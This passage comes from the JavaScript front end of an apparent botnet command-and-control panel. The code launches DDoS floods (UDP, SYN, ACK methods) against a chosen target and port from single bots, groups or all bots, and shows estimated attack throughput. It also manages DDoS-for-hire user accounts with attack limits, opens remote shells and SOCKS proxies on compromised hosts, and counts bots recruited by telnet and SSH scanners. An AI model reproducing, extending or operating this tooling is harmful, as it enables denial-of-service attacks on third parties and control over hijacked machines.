      { label: 'Target', val: target + ':' + port },
      { label: 'Duration', val: duration + 's' },
      { label: 'Scope', val: scope }
    ],
    confirmText: 'Fire',
    confirmClass: 'danger',
    onConfirm: function () {
      if (botID) {
        // Single bot target
        fetch('/api/command', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ command: cmd, botID: botID })
        })
          .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
          .catch(function () { showToast('Attack request failed', false); });
      } else if (atkGroup && window._bots) {
        // Group target — send to each bot in group (with arch/RAM client-side filtering)
        var sent = 0;
        Object.keys(window._bots).forEach(function (id) {
          var b = window._bots[id];
          if (b.group !== atkGroup && b.origin !== atkGroup) return;
          if (archFilter && b.arch !== archFilter) return;
          if (minRAM > 0 && b.ram < minRAM) return;
          fetch('/api/command', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: cmd, botID: id })
          });
          sent++;
        });
        showToast('Sent to ' + sent + ' bots in ' + atkGroup, sent > 0);
      } else {
        // Broadcast (with optional arch/RAM server-side filtering)
        fetch('/api/command', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ command: cmd, botID: '', archFilter: archFilter, minRAM: minRAM })
        })
          .then(function (r) { return r.json(); }).then(function (d) { showToast(d.message, d.success); })
          .catch(function () { showToast('Attack request failed', false); });
      }
    }
  });
}

// Refresh group dropdown in attack panel
function refreshAtkGroups() {
  var sel = document.getElementById('atk-group');
  if (!sel || !window._bots) return;
  var groups = {};
  Object.keys(window._bots).forEach(function (id) {
    var g = window._bots[id].group || window._bots[id].origin;
    if (g && g !== 'direct') groups[g] = (groups[g] || 0) + 1;
  });
  var val = sel.value;
  sel.innerHTML = '<option value="">All Bots</option>';
  Object.keys(groups).sort().forEach(function (g) {
    sel.innerHTML += '<option value="' + escHtml(g) + '">' + escHtml(g) + ' (' + groups[g] + ')</option>';
  });
  sel.value = val;
}

// Refresh arch dropdowns on attack + scanner panels, and update scanner filter count
function refreshArchDropdowns() {
  if (!window._bots) return;
  var archs = {};
  Object.keys(window._bots).forEach(function (id) {
    var a = window._bots[id].arch;
    if (a) archs[a] = (archs[a] || 0) + 1;
  });
  var sorted = Object.keys(archs).sort();
  ['atk-arch', 'scan-arch'].forEach(function (selId) {
    var sel = document.getElementById(selId);
    if (!sel) return;
    var prev = sel.value;
    sel.innerHTML = '<option value="">All</option>';
    sorted.forEach(function (a) {
      sel.innerHTML += '<option value="' + escHtml(a) + '">' + escHtml(a) + ' (' + archs[a] + ')</option>';
    });
    sel.value = prev;
  });
  updateScanFilterCount();
}

function getScanFilters() {
  var archFilter = document.getElementById('scan-arch') ? document.getElementById('scan-arch').value : '';
  var minRAM = document.getElementById('scan-ram') ? parseInt(document.getElementById('scan-ram').value) || 0 : 0;
  return { archFilter: archFilter, minRAM: minRAM };
}

function updateScanFilterCount() {
  var el = document.getElementById('scan-filter-count');
  if (!el || !window._bots) return;
  var archFilter = document.getElementById('scan-arch') ? document.getElementById('scan-arch').value : '';
  var minRAM = document.getElementById('scan-ram') ? parseInt(document.getElementById('scan-ram').value) || 0 : 0;
  if (!archFilter && !minRAM) { el.textContent = ''; return; }
  var count = 0;
  Object.keys(window._bots).forEach(function (id) {
    var b = window._bots[id];
    if (archFilter && b.arch !== archFilter) return;
    if (minRAM > 0 && b.ram < minRAM) return;
    count++;
  });
  el.textContent = count + ' bots match';
}

function stopAttack() {
  var botID = document.getElementById('atk-bot').value.trim();
  var scope = botID || 'ALL bots';

  showConfirm({
    title: 'Stop Attacks',
    message: 'This will immediately stop all running attacks.',
    icon: 'warn',
    details: [
      { label: 'Scope', val: scope }
    ],
    confirmText: 'Stop All',
    confirmClass: 'warn',
    onConfirm: function () {
      fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: '!stopattack', botID: botID })
      })
        .then(function (r) { return r.json(); })
        .then(function (d) { showToast(d.message, d.success); })
        .catch(function () { showToast('Stop request failed', false); });
    }
  });
}

// ---------------------------------------------------------------------------
// Running Attacks & Attack History
// ---------------------------------------------------------------------------

var attackHistoryData = [];
var atkHistSortField = 'startedAt';
var atkHistSortAsc = false;

function renderRunningAttacks(attacks) {
  var container = document.getElementById('atk-running-cards');
  var empty = document.getElementById('atk-running-empty');
  var countEl = document.getElementById('atk-running-count');
  var tabCount = document.getElementById('tab-attack-count');
  if (!container) return;

  if (!attacks || attacks.length === 0) {
    container.innerHTML = '<div class="atk-empty" id="atk-running-empty">No attacks running</div>';
    if (countEl) countEl.textContent = '0 active';
    if (tabCount) tabCount.textContent = '0';
    var g = document.getElementById('throughput-gauge');
    if (g) g.style.display = 'none';
    return;
  }

  if (countEl) countEl.textContent = attacks.length + ' active';
  if (tabCount) tabCount.textContent = String(attacks.length);

  // Update throughput gauge
  var totalBPS = 0, totalPPS = 0;
  attacks.forEach(function (a) { totalBPS += (a.estBPS || 0); totalPPS += (a.estPPS || 0); });
  var gauge = document.getElementById('throughput-gauge');
  var gaugeText = document.getElementById('throughput-text');
  if (gauge && gaugeText) {
    if (totalBPS > 0) {
      var gbps = (totalBPS / 1e9).toFixed(2);
      var mpps = (totalPPS / 1e6).toFixed(1);
      gaugeText.textContent = '~' + gbps + ' Gbps / ~' + mpps + ' Mpps';
      gauge.style.display = '';
    } else {
      gauge.style.display = 'none';
    }
  }

  var html = '';
  attacks.forEach(function (a) {
    var pct = a.duration > 0 ? Math.min(100, Math.round((a.elapsed / a.duration) * 100)) : 0;
    var elMin = Math.floor(a.elapsed / 60);
    var elSec = a.elapsed % 60;
    var remMin = Math.floor(a.remaining / 60);
    var remSec = a.remaining % 60;
    var elStr = (elMin > 0 ? elMin + 'm ' : '') + elSec + 's';
    var remStr = (remMin > 0 ? remMin + 'm ' : '') + remSec + 's';

    html += '<div class="atk-card">' +
      '<div class="atk-card-top">' +
      '<span class="atk-card-method">' + escHtml(a.method) + '</span>' +
      '<span class="atk-card-target">' + escHtml(a.target) + ':' + escHtml(a.port) + '</span>' +
      '<span class="atk-card-user">' + escHtml(a.username || 'web') + '</span>' +
      '<button class="atk-card-stop" onclick="stopSingleAttack(\'' + escHtml(a.target) + '\',\'' + escHtml(a.method) + '\')">Stop</button>' +
      '</div>' +
      '<div class="atk-card-progress"><div class="atk-card-progress-bar" style="width:' + pct + '%"></div></div>' +
      '<div class="atk-card-time">' +
      '<span>Elapsed: ' + elStr + '</span>' +
      '<span>' + pct + '%</span>' +
      '<span>Remaining: ' + remStr + '</span>' +
      '</div>' +
      '</div>';
  });
  container.innerHTML = html;
}

function stopSingleAttack(target, method) {
  showConfirm({
    title: 'Stop Attack',
    message: 'Stop ' + method.toUpperCase() + ' attack on ' + target + '?',
    icon: 'warn',
    confirmText: 'Stop',
    confirmClass: 'warn',
    onConfirm: function () {
      fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: '!stopattack', botID: '' })
      })
        .then(function (r) { return r.json(); })
        .then(function (d) { showToast(d.message, d.success); })
        .catch(function () { showToast('Stop request failed', false); });
    }
  });
}

function loadAttackHistory() {
  fetch('/api/attack-history').then(function (r) { return r.json(); }).then(function (data) {
    attackHistoryData = data || [];
    renderAttackHistory();
  }).catch(function () { });
}

function renderAttackHistory() {
  var tbody = document.getElementById('atk-history-tbody');
  var empty = document.getElementById('atk-history-empty');
  var tbl = document.getElementById('atk-history-tbl');
  if (!tbody) return;

  if (!attackHistoryData || attackHistoryData.length === 0) {
    tbody.innerHTML = '';
    if (empty) empty.style.display = '';
    if (tbl) tbl.style.display = 'none';
    return;
  }

  if (empty) empty.style.display = 'none';
  if (tbl) tbl.style.display = '';

  // Sort
  var sorted = attackHistoryData.slice().sort(function (a, b) {
    var va = a[atkHistSortField], vb = b[atkHistSortField];
    if (atkHistSortField === 'startedAt' || atkHistSortField === 'endedAt') {
      va = new Date(va || 0).getTime();
      vb = new Date(vb || 0).getTime();
    }
    if (atkHistSortField === 'duration' || atkHistSortField === 'port') {
      va = Number(va) || 0;
      vb = Number(vb) || 0;
    }
    if (va < vb) return atkHistSortAsc ? -1 : 1;
    if (va > vb) return atkHistSortAsc ? 1 : -1;
    return 0;
  });

  var html = '';
  sorted.forEach(function (r) {
    var started = r.startedAt ? new Date(r.startedAt) : null;
    var startStr = started ? started.toLocaleString() : '-';
    var statusCls = r.status === 'completed' ? 'atk-status-completed' : 'atk-status-stopped';
    html += '<tr>' +
      '<td><span class="atk-card-method">' + escHtml(r.method) + '</span></td>' +
      '<td style="font-family:var(--mono)">' + escHtml(r.target) + '</td>' +
      '<td>' + escHtml(String(r.port)) + '</td>' +
      '<td>' + r.duration + 's</td>' +
      '<td>' + escHtml(r.username || '-') + '</td>' +
      '<td style="font-size:11px">' + escHtml(startStr) + '</td>' +
      '<td><span class="atk-status ' + statusCls + '">' + escHtml(r.status) + '</span></td>' +
      '</tr>';
  });
  tbody.innerHTML = html;
}

function sortAtkHistory(field) {
  if (atkHistSortField === field) {
    atkHistSortAsc = !atkHistSortAsc;
  } else {
    atkHistSortField = field;
    atkHistSortAsc = field === 'startedAt' ? false : true;
  }
  renderAttackHistory();
}

function clearAttackHistory() {
  showConfirm({
    title: 'Clear Attack History',
    message: 'This will permanently delete all attack history records.',
    icon: 'warn',
    confirmText: 'Clear',
    confirmClass: 'warn',
    onConfirm: function () {
      fetch('/api/attack-history', { method: 'DELETE' })
        .then(function (r) { return r.json(); })
        .then(function (d) {
          showToast(d.message, d.success);
          attackHistoryData = [];
          renderAttackHistory();
        })
        .catch(function () { showToast('Failed to clear history', false); });
    }
  });
}

// ---------------------------------------------------------------------------
// Users Management
// ---------------------------------------------------------------------------

var usersData = [];

function loadUsers() {
  fetch('/api/users').then(function (r) { return r.json(); }).then(function (users) {
    usersData = users;
    renderUserCards(users);
  }).catch(function () { showToast('Failed to load users', false); });
}

function renderUserCards(users) {
  var grid = document.getElementById('users-grid');
  if (!users || !users.length) {
    grid.innerHTML = '<div class="no-bots">No users found</div>';
    return;
  }
  grid.innerHTML = users.map(function (u) {
    var expired = new Date(u.expire) < new Date();
    var levelClass = 'ul-' + u.level.toLowerCase();
    var botsStr = u.maxbots > 0 ? u.maxbots : 'all';
    var methods = (u.methods || []).join(', ') || 'none';
    return '<div class="user-card' + (expired ? ' user-expired' : '') + '">' +
      '<div class="uc-header">' +
      '<span class="uc-name">' + escHtml(u.username) + '</span>' +
      '<span class="uc-level ' + levelClass + '">' + escHtml(u.level) + '</span>' +
      '</div>' +
      '<div class="uc-body">' +
      '<div class="uc-field"><span class="uc-label">Password</span><span class="uc-val">' + escHtml(u.password) + '</span></div>' +
      '<div class="uc-field"><span class="uc-label">Expires</span><span class="uc-val' + (expired ? ' uc-expired' : '') + '">' + escHtml(u.expire) + (expired ? ' (expired)' : '') + '</span></div>' +
      '<div class="uc-field"><span class="uc-label">Max Time</span><span class="uc-val">' + u.maxtime + 's</span></div>' +
      '<div class="uc-field"><span class="uc-label">Concurrents</span><span class="uc-val">' + u.concurrents + '</span></div>' +
      '<div class="uc-field"><span class="uc-label">Max Bots</span><span class="uc-val">' + botsStr + '</span></div>' +
      '<div class="uc-field uc-field-full"><span class="uc-label">Methods</span><span class="uc-val uc-methods">' + escHtml(methods) + '</span></div>' +
      '</div>' +
      '<div class="uc-actions">' +
      '<button class="uc-btn uc-edit" onclick="editUser(\'' + escHtml(u.username) + '\')">Edit</button>' +
      '<button class="uc-btn uc-delete" onclick="deleteUser(\'' + escHtml(u.username) + '\')">Delete</button>' +
      '</div>' +
      '</div>';
  }).join('');
}

function showAddUserForm() {
  document.getElementById('user-form-title').textContent = 'Add User';
  document.getElementById('uf-editing').value = '';
  document.getElementById('uf-username').value = '';
  document.getElementById('uf-username').disabled = false;
  document.getElementById('uf-password').value = '';
  document.getElementById('uf-level').value = 'Basic';
  var d = new Date(); d.setMonth(d.getMonth() + 1);
  document.getElementById('uf-expire').value = d.toISOString().split('T')[0];
  document.getElementById('uf-maxtime').value = '300';
  document.getElementById('uf-concurrents').value = '1';
  document.getElementById('uf-maxbots').value = '0';
  document.getElementById('uf-methods').value = 'udpplain,syn,ack';
  document.getElementById('users-form-wrap').style.display = '';
}

function editUser(username) {
  var u = usersData.find(function (x) { return x.username === username; });
  if (!u) return;
  document.getElementById('user-form-title').textContent = 'Edit User';
  document.getElementById('uf-editing').value = username;
  document.getElementById('uf-username').value = u.username;
  document.getElementById('uf-username').disabled = true;
  document.getElementById('uf-password').value = u.password;
  document.getElementById('uf-level').value = u.level;
  document.getElementById('uf-expire').value = u.expire;
  document.getElementById('uf-maxtime').value = u.maxtime;
  document.getElementById('uf-concurrents').value = u.concurrents;
  document.getElementById('uf-maxbots').value = u.maxbots;
  document.getElementById('uf-methods').value = (u.methods || []).join(',');
  document.getElementById('users-form-wrap').style.display = '';
}

function hideUserForm() {
  document.getElementById('users-form-wrap').style.display = 'none';
}

function saveUser() {
  var editing = document.getElementById('uf-editing').value;
  var username = document.getElementById('uf-username').value.trim();
  var password = document.getElementById('uf-password').value.trim();
  var level = document.getElementById('uf-level').value;
  var expire = document.getElementById('uf-expire').value;
  var maxtime = parseInt(document.getElementById('uf-maxtime').value) || 300;
  var concurrents = parseInt(document.getElementById('uf-concurrents').value) || 1;
  var maxbots = parseInt(document.getElementById('uf-maxbots').value) || 0;
  var methodsStr = document.getElementById('uf-methods').value.trim();
  var methods = methodsStr ? methodsStr.split(',').map(function (m) { return m.trim(); }).filter(Boolean) : [];

  if (!username || !password) {
    showToast('Username and password required', false);
    return;
  }

  var payload = {
    username: username,
    password: password,
    level: level,
    expire: expire,
    maxtime: maxtime,
    concurrents: concurrents,
    maxbots: maxbots,
    methods: methods
  };

  var method = editing ? 'PUT' : 'POST';
  fetch('/api/users', {
    method: method,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.success) {
        showToast(editing ? 'User updated' : 'User created', true);
        hideUserForm();
        loadUsers();
      } else {
        showToast(d.error || 'Failed', false);
      }
    })
    .catch(function () { showToast('Request failed', false); });
}

function deleteUser(username) {
  if (!confirm('Delete user "' + username + '"?')) return;
  fetch('/api/users', {
    method: 'DELETE',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: username })
  })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      if (d.success) {
        showToast('User deleted', true);
        loadUsers();
      } else {
        showToast(d.error || 'Failed', false);
      }
    })
    .catch(function () { showToast('Delete failed', false); });
}

// ---------------------------------------------------------------------------
// Theme toggle
// ---------------------------------------------------------------------------

function applyTheme(theme) {
  document.documentElement.setAttribute('data-theme', theme);
  var btn = document.getElementById('theme-toggle');
  if (btn) {
    btn.querySelector('.sun').style.display = theme === 'dark' ? 'none' : 'block';
    btn.querySelector('.moon').style.display = theme === 'dark' ? 'block' : 'none';
  }
}

function toggleTheme() {
  var current = document.documentElement.getAttribute('data-theme') || 'dark';
  var next = current === 'dark' ? 'light' : 'dark';
  applyTheme(next);
  try { localStorage.setItem('armada-theme', next); } catch (e) { }
}

// ---------------------------------------------------------------------------
// RBAC — Role-Based Access Control
// ---------------------------------------------------------------------------

var userLevel = 'Owner'; // default until /api/session responds

function applyRBAC() {
  // Tab visibility rules: which roles can see each tab
  var tabRules = {
    'tab-users': ['Owner', 'Admin'],
    'tab-relays': ['Owner', 'Admin'],
    'tab-tasks': ['Owner', 'Admin']
  };
  // Hide/show tab buttons based on their data-tab attribute
  document.querySelectorAll('.tab-bar .tab[data-tab]').forEach(function (btn) {
    var tab = btn.getAttribute('data-tab');
    if (tabRules[tab]) {
      btn.style.display = (tabRules[tab].indexOf(userLevel) !== -1) ? '' : 'none';
    }
  });
  // Hide dangerous action buttons for Basic/Pro
  if (userLevel === 'Basic' || userLevel === 'Pro') {
    // Kill button in multi-select bar
    document.querySelectorAll('.ms-btn-danger').forEach(function (el) { el.style.display = 'none'; });
  }
}

// Re-apply RBAC on dynamic content (popup and drawer actions)
function rbacFilterActions() {
  if (userLevel === 'Basic' || userLevel === 'Pro') {
    document.querySelectorAll('.act-kill').forEach(function (el) { el.style.display = 'none'; });
    document.querySelectorAll('.drawer-act.danger').forEach(function (el) { el.style.display = 'none'; });
    // Also hide Reinstall buttons in drawer
    document.querySelectorAll('.drawer-act').forEach(function (el) {
      if (el.textContent.trim() === 'Reinstall') el.style.display = 'none';
    });
  }
}

// Fetch session level on load
fetch('/api/session').then(function (r) { return r.json(); }).then(function (d) {
  userLevel = d.level || 'Owner';
  applyRBAC();
}).catch(function () { });

// ---------------------------------------------------------------------------
// Initialization
// ---------------------------------------------------------------------------

(function () {
  var saved = 'dark';
  try { saved = localStorage.getItem('armada-theme') || 'dark'; } catch (e) { }
  applyTheme(saved);
})();

updateArgFields();
updateTaskArgFields();
loadAttackMethods();
loadAttackHistory();

// Restore persisted UI state
(function () {
  // Compact mode
  if (lsGet('compact', false)) { toggleCompactMode(); }
  // Active tab
  var savedTab = lsGet('tab', null);
  if (savedTab) { var tb = document.querySelector('[data-tab="' + savedTab + '"]'); if (tb) switchTab(tb); }
  // Command bar collapsed
  if (lsGet('cmdCollapsed', false)) { toggleCmdBar(); }
  // Filters
  var savedFilters = lsGet('filters', null);
  if (savedFilters) { activeFilters = savedFilters; }
  // Search query
  var savedSearch = lsGet('search', '');
  if (savedSearch) { document.getElementById('bot-search').value = savedSearch; }
  // Notifications
  notifHistory = lsGet('notifs', []);
  notifUnseen = 0;
  renderNotifList();
})();

fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () { });
fetch('/api/bots').then(function (r) { return r.json(); }).then(function (bots) {
  updateBots(bots);
  // Restore sort after first bot load
  var savedSort = lsGet('sort', null);
  if (savedSort && savedSort.field) {
    sortField = savedSort.field;
    sortAsc = !savedSort.asc; // sortBots toggles, so invert
    sortBots(savedSort.field);
  }
}).catch(function () { });
fetch('/api/activity').then(function (r) { return r.json(); }).then(function (entries) { renderActivityFull(entries); }).catch(function () { });
connectSSE();

// Refresh health indicators every 10s (ago text + health dots go stale between SSE updates)
setInterval(function () {
  document.querySelectorAll('#bot-tbody tr.bot-row').forEach(function (r) {
    var id = r.getAttribute('data-botid');
    var b = botState[id]; if (!b) return;
    var cells = r.getElementsByTagName('td');
    if (cells.length < 14) return;
    var h = botHealth(b.lastPing);
    cells[13].className = h.cls;
    cells[13].innerHTML = '<span class="health-dot ' + h.dot + '"></span>' + ago(b.lastPing);
    r.className = 'bot-row ' + h.row;
  });
}, 10000);

// ---------------------------------------------------------------------------
// Scanner stats — count bots by origin to show recruitment numbers
// ---------------------------------------------------------------------------
function updateScannerStats() {
  var grid = document.getElementById('scanner-stats-grid');
  if (!grid || !window._bots) return;
  var counts = {};
  Object.keys(window._bots).forEach(function (id) {
    var o = window._bots[id].origin || 'direct';
    counts[o] = (counts[o] || 0) + 1;
  });
  var html = '';
  var order = ['direct', 'b0at.telnet', 'b0at.ssh'];
  order.forEach(function (key) {
    var n = counts[key] || 0;
    var label = key === 'direct' ? 'Direct' : key.replace('b0at.', '');
    var color = _originColors[key] || '#8b949e';
    html += '<div class="scanner-stat-card" style="border-color:' + color + '44">' +
      '<div class="scanner-stat-name" style="color:' + color + '">' + label + '</div>' +
      '<div class="scanner-stat-count" style="color:' + color + '">' + n + '</div>' +
      '<div class="scanner-stat-label">bots recruited</div></div>';
  });
  // Also count any unknown origins
  Object.keys(counts).forEach(function (k) {
    if (order.indexOf(k) < 0) {
      html += '<div class="scanner-stat-card"><div class="scanner-stat-name">' + escHtml(k) + '</div>' +
        '<div class="scanner-stat-count">' + counts[k] + '</div><div class="scanner-stat-label">bots</div></div>';
    }
  });
  grid.innerHTML = html;
}

// Hook into bot refresh cycle
var _origUpdateBotCount = typeof updateBotCount === 'function' ? updateBotCount : null;
if (_origUpdateBotCount) {
  updateBotCount = function () {
    _origUpdateBotCount();
    updateScannerStats();
  };
}

// ---------------------------------------------------------------------------
// Bot Detail Drawer — full-height right panel
// ---------------------------------------------------------------------------
var _drawerBotID = '';

function openDrawer(botID) {
  var b = window._bots && window._bots[botID];
  if (!b) return;
  _drawerBotID = botID;
  var d = document.getElementById('bot-drawer');

  document.getElementById('dr-botid').textContent = b.botID;
  document.getElementById('dr-ip').textContent = b.ip;
  document.getElementById('dr-country').innerHTML = countryFlag(b.country) + ' ' + b.country;
  document.getElementById('dr-origin').innerHTML = originBadge(b.origin);
  document.getElementById('dr-group').textContent = b.group || '—';
  document.getElementById('dr-arch').textContent = b.arch;
  document.getElementById('dr-ram').textContent = formatRAM(b.ram);
  document.getElementById('dr-cpu').textContent = b.cpuCores + ' cores';
  document.getElementById('dr-proc').textContent = b.processName;
  document.getElementById('dr-uptime').textContent = b.uptime;
  var _drPingEl = document.getElementById('dr-ping');
  _drPingEl.textContent = ago(b.lastPing);
  _drPingEl._lastPing = b.lastPing;
  document.getElementById('dr-socks').textContent = b.socksActive ? 'Active (' + (b.socksRelay || 'direct') + ')' : 'Inactive';
  document.getElementById('drawer-title').textContent = b.botID.substring(0, 8);

  var id = b.botID.replace(/'/g, "\\'");
  var acts = '';
  acts += '<button class="drawer-act" onclick="closeDrawer();openShell(\'' + id + '\')">Shell</button>';
  acts += '<button class="drawer-act" onclick="popupStartSocks(\'' + id + '\')">SOCKS</button>';
  acts += '<button class="drawer-act" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')">Stop SOCKS</button>';
  acts += '<button class="drawer-act" onclick="popupCmd(\'' + id + '\',\'!updatefetch\')">Update Fetch</button>';
  acts += '<button class="drawer-act danger" onclick="popupKill(\'' + id + '\')">Kill</button>';

  document.getElementById('dr-actions').innerHTML = acts;
  rbacFilterActions();
  d.classList.add('open');
  document.getElementById('bot-drawer-backdrop').classList.add('open');
}

function closeDrawer() {
  document.getElementById('bot-drawer').classList.remove('open');
  document.getElementById('bot-drawer-backdrop').classList.remove('open');
  _drawerBotID = '';
}

// ---------------------------------------------------------------------------
// Bot Map — SVG world map with country dot plotting (Tor-safe, no CDN)
// Uses a simple equirectangular projection of country centroids.
// ---------------------------------------------------------------------------
// Webhooks Management
// ---------------------------------------------------------------------------

var _webhooksCache = [];

function loadWebhooks() {
  fetch('/api/webhooks').then(function (r) { return r.json(); }).then(function (list) {
    _webhooksCache = list || [];
    renderWebhookTable(_webhooksCache);
  }).catch(function () { });
}

function renderWebhookTable(webhooks) {
  var wrap = document.getElementById('webhook-table-wrap');
  if (!wrap) return;
  if (!webhooks || !webhooks.length) {
    wrap.innerHTML = '<div class="no-bots">No webhooks configured. Add one above.</div>';
    return;
  }
  var html = '<table class="socks-dash-table"><thead><tr>' +
    '<th>Label</th><th>URL</th><th>Events</th><th>Enabled</th><th></th>' +
    '</tr></thead><tbody>';
  webhooks.forEach(function (wh) {
    var urlDisplay = wh.url.length > 55 ? wh.url.substring(0, 55) + '...' : wh.url;
    var evtPills = (wh.events || []).map(function (e) {
      return '<span style="display:inline-block;padding:1px 6px;border-radius:8px;font-size:10px;margin:1px 2px;' +
        'background:var(--bg-tertiary,#21262d);color:var(--text-dim)">' + escHtml(e) + '</span>';
    }).join('');
    var enabledDot = wh.enabled
      ? '<span style="color:var(--green)">● On</span>'
      : '<span style="color:var(--text-dim)">○ Off</span>';
    html += '<tr>' +
      '<td style="color:var(--accent);font-family:monospace">' + escHtml(wh.label || 'Webhook') + '</td>' +
      '<td style="font-family:monospace;font-size:11px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="' + escHtml(wh.url) + '">' + escHtml(urlDisplay) + '</td>' +
      '<td>' + evtPills + '</td>' +
      '<td>' + enabledDot + '</td>' +
      '<td style="white-space:nowrap">' +
      '<button class="socks-stop-btn" style="margin-right:4px" onclick="toggleWebhook(\'' + escHtml(wh.id) + '\',' + (!wh.enabled) + ')">' + (wh.enabled ? 'Disable' : 'Enable') + '</button>' +
      '<button class="socks-stop-btn" onclick="deleteWebhook(\'' + escHtml(wh.id) + '\')">Delete</button>' +
      '</td></tr>';
  });
  wrap.innerHTML = html + '</tbody></table>';
}

function addWebhook() {
  var label = (document.getElementById('wh-label') || {}).value || 'Webhook';
  var url = (document.getElementById('wh-url') || {}).value || '';
  if (!url) { showToast('Webhook URL is required', false); return; }

  var events = [];
  var boxes = document.querySelectorAll('#wh-events input[type=checkbox]');
  for (var i = 0; i < boxes.length; i++) {
    if (boxes[i].checked) events.push(boxes[i].value);
  }
  if (!events.length) { showToast('Select at least one event type', false); return; }

  var enabled = document.getElementById('wh-enabled') ? document.getElementById('wh-enabled').checked : true;

  fetch('/api/webhooks', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ label: label, url: url, events: events, enabled: enabled })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      showToast('Webhook added: ' + label, true);
      document.getElementById('wh-label').value = '';
      document.getElementById('wh-url').value = '';
      loadWebhooks();
    } else {
      showToast(d.error || 'Failed to add webhook', false);
    }
  }).catch(function () { showToast('Request failed', false); });
}

function deleteWebhook(id) {
  if (!confirm('Remove this webhook?')) return;
  fetch('/api/webhooks?id=' + encodeURIComponent(id), { method: 'DELETE' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      showToast(d.success ? 'Webhook removed' : (d.error || 'Failed'), d.success !== false);
      loadWebhooks();
    }).catch(function () { showToast('Request failed', false); });
}

function toggleWebhook(id, newState) {
  fetch('/api/webhooks', {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ id: id, enabled: newState })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      showToast('Webhook ' + (newState ? 'enabled' : 'disabled'), true);
      loadWebhooks();
    } else {
      showToast(d.error || 'Failed', false);
    }
  }).catch(function () { showToast('Request failed', false); });
}

function testWebhooks() {
  fetch('/api/webhooks/test', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: '{}'
  }).then(function (r) { return r.json(); }).then(function (d) {
    showToast(d.success ? 'Test sent to all enabled webhooks' : (d.error || 'Failed'), d.success);
  }).catch(function () { showToast('Request failed', false); });
}

// ---------------------------------------------------------------------------
// Command Templates
// ---------------------------------------------------------------------------
var cachedTemplates = [];

function loadCmdTemplates() {
  fetch('/api/templates').then(function (r) { return r.json(); }).then(function (list) {
    cachedTemplates = list || [];
    var sel = document.getElementById('cmd-tpl-select');
    if (!sel) return;
    sel.innerHTML = '<option value="">-- Templates --</option>';
    cachedTemplates.forEach(function (t) {
      var opt = document.createElement('option');
      opt.value = t.id;
      opt.textContent = t.name;
      sel.appendChild(opt);
    });
  }).catch(function () { });
}

function applyCmdTemplate() {
  var sel = document.getElementById('cmd-tpl-select');
  if (!sel || !sel.value) return;
  var tmpl = null;
  for (var i = 0; i < cachedTemplates.length; i++) {
    if (cachedTemplates[i].id === sel.value) { tmpl = cachedTemplates[i]; break; }
  }
  if (!tmpl) return;

  var cmdSel = document.getElementById('cmd-type');
  if (cmdSel) {
    var opt = cmdSel.querySelector('option[value="' + tmpl.cmdType + '"]');
    if (opt) {
      var cat = opt.getAttribute('data-cat');
      var catBtns = document.querySelectorAll('.cmd-cat');
      catBtns.forEach(function (b) {
        b.classList.remove('active');
        if (b.getAttribute('data-cat') === cat) b.classList.add('active');
      });
      for (var i = 0; i < cmdSel.options.length; i++) {
        var oc = cmdSel.options[i].getAttribute('data-cat');
        cmdSel.options[i].style.display = (oc === cat) ? '' : 'none';
      }
    }
    cmdSel.value = tmpl.cmdType;
    updateArgFields();
  }

  if (tmpl.args) {
    setTimeout(function () {
      var keys = Object.keys(tmpl.args);
      for (var i = 0; i < keys.length; i++) {
        var el = document.getElementById(keys[i]);
        if (el) {
          el.value = tmpl.args[keys[i]];
          if (el.tagName === 'SELECT') updateConditionalFields();
        }
      }
      updateConditionalFields();
    }, 50);
  }

  showToast('Template loaded: ' + tmpl.name, true);
}

function saveCmdTemplate() {
  var cmdType = document.getElementById('cmd-type').value;
  var name = prompt('Template name:');
  if (!name) return;

  var args = {};
  var defs = cmdArgDefs[cmdType] || [];
  defs.forEach(function (d) {
    var el = document.getElementById(d.id);
    if (el && el.value) args[d.id] = el.value;
  });

  fetch('/api/templates', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: name, cmdType: cmdType, args: args })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      showToast('Template saved: ' + name, true);
      loadCmdTemplates();
    } else {
      showToast(d.error || 'Failed to save template', false);
    }
  }).catch(function () { showToast('Request failed', false); });
}

function deleteCmdTemplate() {
  var sel = document.getElementById('cmd-tpl-select');
  if (!sel || !sel.value) { showToast('Select a template first', false); return; }
  var id = sel.value;
  var name = sel.options[sel.selectedIndex].textContent;
  if (!confirm('Delete template "' + name + '"?')) return;

  fetch('/api/templates?id=' + encodeURIComponent(id), { method: 'DELETE' })
    .then(function (r) { return r.json(); }).then(function (d) {
      if (d.success) {
        showToast('Template deleted', true);
        loadCmdTemplates();
      } else {
        showToast(d.error || 'Failed', false);
      }
    }).catch(function () { showToast('Request failed', false); });
}

// ---------------------------------------------------------------------------
// Command History
// ---------------------------------------------------------------------------
function toggleCmdHistory() {
  var dd = document.getElementById('cmd-history-dropdown');
  if (!dd) return;
  if (dd.classList.contains('open')) {
    dd.classList.remove('open');
    return;
  }
  fetch('/api/cmd-history').then(function (r) { return r.json(); }).then(function (list) {
    if (!list || !list.length) {
      dd.innerHTML = '<div class="cmd-history-empty">No command history yet</div>';
    } else {
      var items = list.slice(-20).reverse();
      var html = '';
      items.forEach(function (entry) {
        var cmd = entry.cmdType || '';
